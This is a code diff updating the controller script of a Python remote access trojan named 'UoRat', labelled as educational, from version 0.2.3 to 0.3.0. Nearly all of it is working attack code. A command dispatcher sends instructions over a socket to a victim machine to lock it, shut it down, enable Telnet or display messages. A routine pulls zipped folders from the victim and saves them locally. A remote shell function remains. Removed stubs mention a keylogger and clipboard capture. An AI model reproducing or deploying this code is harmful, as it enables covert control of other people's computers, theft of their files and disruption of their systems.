@@ -2,8 +2,8 @@
 +-----------------------------------------------------------------------+
 |                               UoRat                                   |
 |    Author: 27016005                                                   |
-|    Version: 0.2.3                                                     |
-|    Last update: 25-02-2021 (dd-mm-yyyy)                               |
+|    Version: 0.3.0                                                     |
+|    Last update: 08-04-2021 (dd-mm-yyyy)                               |
 |                                                                       |
 |                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
 +-----------------------------------------------------------------------+
@@ -13,7 +13,7 @@ In order to use this tool you need to do some tweaking:
     2. Select a PORT number, the default value set in the client file is 1337
     3. Play around with the paths, I've set some default values but you can change them
 ------ NOTE ------
-This code was tested and developed on a Linux machine, it may not work on other machines.
+This code was tested and developed on a Windows machine, in theory it should work on Linux - it may not work on other machines.
 """
 
 import socket
@@ -23,19 +23,34 @@ import time
 import random
 import string
 
-
 class Server:
     def __init__(self, ip, port, buffer_size):
         self.IP = ip
         self.PORT = port
-        self.BACKUP_PORT = 8080
+        #self.BACKUP_PORT = 8080
         self.BUFFER_SIZE = buffer_size
-
         self.connections = []  # connections list
         self.info = ""  # info about target
         self.recvcounter = 0  # counter for received files
-
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        self.Switcher = {
+            #"-Host": self.sendHostInfo,
+            "-Msg": self.sendMsg,
+        #     "-Fsend": self.filesend,
+        #     "-RP": self.runprocess,
+        #     "-RR": self.runrun,
+             "-Telnet": self.enableTN,
+             "-Chess": self.playchess,
+             "-EpIV": self.playstarwars,
+             "-Weather": self.weather,
+             "-lock": self.locksystem,
+             "-shutdown": self.shutdown,
+        #     "-shutdownM": self.shutdownmessage,
+        #     "-restart": self.restart,
+        #     "-shell": self.fakeshell,
+        #     "-loop": self.endless
+        }
 
     def startServer(self):
         self.server.bind((self.IP, self.PORT))
@@ -79,11 +94,8 @@ class Server:
             self.close()
 
     def sendMsg(self):
-        command = "msg"
-        print("test")
-        input()
+        command = "-Msg"
         self.client_socket.send(command.encode())
-
         msg = input("[+] Enter message: ")
         time.sleep(2)
         self.client_socket.send(msg.encode())
@@ -91,20 +103,54 @@ class Server:
         results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
         print(results)
 
-    def oncoDLF(self):
-
-        command = "sendZip"
+    def shutdown(self):
+        command = "-shutdown"
         self.client_socket.send(command.encode("utf-8"))
 
-        path = input("[+] Enter path (NOT A SINGLE FILE): ")
+        self.client_socket.close()
+        print(f"[!] {self.address[0]} has been Shut Down")
+
+        # locks the user out while keeping connection up
+
+    def locksystem(self):
+        command = "-lock"
+        self.client_socket.send(command.encode("utf-8"))
+
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print(response)
+
+    def playstarwars(self):
+        command = "-EpIV"
+        self.client_socket.send(command.encode("utf-8"))
+        print(f"[!] {self.address[0]} is now watching Star Wars Episode IV:  A New Hope")
+
+    def playchess(self):
+        command = "-Chess"
+        self.client_socket.send(command.encode("utf-8"))
+        print(f"[!] {self.address[0]} is now Playing Chess!! ♜	♞	♝	♛	♚	♝	♞	♜")
+
+    def weather(self):
+        command = "-Weather"
+        self.client_socket.send(command.encode("utf-8"))
+        print(f"[!] {self.address[0]} is checking the weather! ")
+
+    def enableTN(self):
+        command = "-Chess"
+        self.client_socket.send(command.encode("utf-8"))
+        print(f"[!] {self.address[0]} *SHOULD* now have Telnet Client Enabled")
+
+## TODO: Update
+    def filesend(self):
+        command = "-Fsend"
+        self.client_socket.send(command.encode("utf-8"))
+
+        path = input("[+] Enter the file path of the designated folder (NOT A SINGLE FILE): ")
         self.client_socket.send(path.encode("utf-8"))
 
         response = self.client_socket.recv(self.BUFFER_SIZE)
         if response.decode("utf-8") == "Success":
-            # recv size
             size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
             time.sleep(0.1)
-
             if int(size) <= self.BUFFER_SIZE:
                 # recv archive
                 archive = self.client_socket.recv(self.BUFFER_SIZE)
@@ -115,47 +161,57 @@ class Server:
 
                 print("*** File saved ***")
                 self.recvcounter += 1
+            else:
+                # update buffer
+                buff = self.updateBuffer(size)
 
-            else:  # # TODO For a VERY LARGE FILE
-                print("very large file")
-                '''Do this'''
-                # Update Buffer Size, Save Big File  Then continue as above
+                # recv archive
+                fullarchive = self.saveBigFile(int(size), buff)
+
+                print("*** Got file *** ")
+                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
+                    output.write(fullarchive)
+
+                print("*** File saved ***")
+                self.recvcounter += 1
         else:
-            print("failed")
             print(response.decode("utf-8"))
-            # print them
-            # # print("goes wrong before here? ")
 
 
-    def zipF(self):
-        command = "sendZip"
-        self.client_socket.send(command.encode())
-        fp = input("[+] What is the filepath?: ")
-        self.client_socket.send(fp.encode())
-        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
-        print(results)
-        # update buffer
-        buff = self.updateBuffer(size)
-
-        # recv archive
-        fullarchive = self.saveBigFile(int(size), buff)
-
-        print("*** Got file *** ")
-        with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
-            output.write(fullarchive)
-
-        print("*** File saved ***")
-        self.recvcounter += 1
-
-    def shutdown(self):
-        command = "shutdown /s"
+## TODO
+    def shutdownmessage(self):
+        command = "-shutdownM"
         self.client_socket.send(command.encode("utf-8"))
 
         self.client_socket.close()
         print(f"[!] {self.address[0]} has been Shut Down")
 
-    def commands(self):
+        # locks the user out while keeping connection up
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    def commands(self):
+        # os.system("clear")
         while True:
          # get the command from prompt
             command = input("Enter the command you want to execute:")
@@ -166,35 +222,22 @@ class Server:
             if command == "exit":
                 # if the command is exit, just break out of the loop
                 break
-
-            elif command == "msg":
-                # retrieve command results
-                print("here2")
-                input()
-                self.sendMsg()
-
-            elif command == "shell":
-                self.cmdctrl()
-            elif command == "sendZip":
-                self.oncoDLF()
-            elif command == "shutdown":
-                self.shutdown()
-            elif command == "disconn":
-                self.client_socket.send(command.encode("utf-8"))
-                print("*** Killed")
-            elif command == "getInfo":  # TODO getInfo
-                '''do this'''
-            elif command == "MsgBox":   # TODO messagebox
-                '''do this'''
-            elif command == "Clipboard ":  # TODO clipboard
-                '''do this'''
-            elif command == "keylogger":         # TODO
-                '''do this'''
-
             else:
+                try:
+                    func = self.Switcher.get(command)
+                    func()
+                except TypeError:
+                    print("This operation does not exist. ")
+                except ConnectionResetError:
+                    """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """
 
+                    print("[!] Connection Reset Error")
+                    #self.closeConnection()
+                except KeyboardInterrupt:
+                    print("\n[ STOPPED RECEIVING DATA ]")
+                except Exception as e:
+                    print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))
 
-                print("No Valid Command Received")
         sys.exit()
         # close connection to the client
         self.client_socket.close()
@@ -202,11 +245,6 @@ class Server:
         self.close()
 
         print(results)
-
-    def disconn(self):
-        command = "disconnect"
-        self.client_socket.send(command.encode("utf-8"))
-        print("*** Killed")
 
     def cmdctrl(self):
         """ This is not a real interactive shell, you get the output
@@ -240,16 +278,6 @@ class Server:
                 break
 
             print(output.decode("utf-8"))
-
-    def printOptions(self):
-        '''
-        msg
-        shell
-        sendZip
-        shutdown
-        disconnect
-        getInfo
-        '''
 
 
 def main():
